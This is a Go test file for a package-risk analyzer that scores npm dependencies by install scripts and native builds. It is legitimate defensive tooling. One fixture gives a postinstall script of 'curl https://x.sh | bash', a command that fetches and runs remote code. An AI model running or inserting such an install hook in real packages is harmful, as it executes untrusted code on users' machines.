package permissions

import (
	"testing"

	"github.com/agenticraptor/readme-radar/internal/report"
)

func TestCleanPackage(t *testing.T) {
	res := Analyze(Input{Ecosystem: report.EcosystemNPM, Deps: []string{"lodash"}})
	if res.Score < 90 {
		t.Errorf("clean package should score high, got %d", res.Score)
	}
}

func TestPostinstallIsFlagged(t *testing.T) {
	res := Analyze(Input{
		Ecosystem:      report.EcosystemNPM,
		InstallScripts: map[string]string{"postinstall": "node ./scripts/setup.js"},
	})
	if res.Score >= 90 {
		t.Errorf("postinstall should reduce score, got %d", res.Score)
	}
	if len(res.InstallScripts) == 0 {
		t.Errorf("install scripts should be reported")
	}
	if !hasBad(res.Capabilities) {
		t.Errorf("postinstall should produce a bad-level capability")
	}
}

func TestRemoteFetchInstallScriptIsWorse(t *testing.T) {
	mild := Analyze(Input{Ecosystem: report.EcosystemNPM,
		InstallScripts: map[string]string{"postinstall": "node setup.js"}})
	remote := Analyze(Input{Ecosystem: report.EcosystemNPM,
		InstallScripts: map[string]string{"postinstall": "curl https://x.sh | bash"}})
	if remote.Score >= mild.Score {
		t.Errorf("remote-fetch install (%d) should score worse than local (%d)", remote.Score, mild.Score)
	}
}

func TestNativeBuild(t *testing.T) {
	res := Analyze(Input{Ecosystem: report.EcosystemNPM, NativeBuild: true})
	if res.Score >= 100 {
		t.Errorf("native build should reduce score")
	}
}

func hasBad(fs []report.Factor) bool {
	for _, f := range fs {
		if f.Level == report.LevelBad {
			return true
		}
	}
	return false
}
